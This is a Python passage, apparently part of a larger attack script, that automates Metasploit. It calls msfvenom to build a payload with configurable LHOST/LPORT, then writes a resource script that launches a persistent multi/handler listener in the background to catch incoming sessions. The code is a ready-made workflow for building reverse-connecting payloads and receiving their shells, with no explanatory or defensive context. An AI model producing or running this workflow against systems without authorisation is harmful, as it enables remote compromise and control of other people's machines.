import subprocess

# Phase 2: Generate payload with msfvenom
def generate_payload(config):
    cmd = [
        "msfvenom",
        "-p", config["payload"],
        f"LHOST={config['lhost']}",
        f"LPORT={config['lport']}",
        "-f", config["format"],
        "-o", config["output"]
    ]
    print("[*] Generating payload...")
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode == 0:
        print("[+] Payload generated:", config["output"])
    else:
        print("[!] Error:\n", result.stderr)

generate_payload(payload_config)
# Phase 3: Create Metasploit resource script for listener
def generate_rc(config, filename="handler.rc"):
    rc_content = f"""
use exploit/multi/handler
set payload {config['payload']}
set LHOST {config['lhost']}
set LPORT {config['lport']}
set ExitOnSession false
exploit -j
"""
    with open(filename, "w") as f:
        f.write(rc_content.strip())
    print(f"[+] Handler RC script written to {filename}")

generate_rc(payload_config)

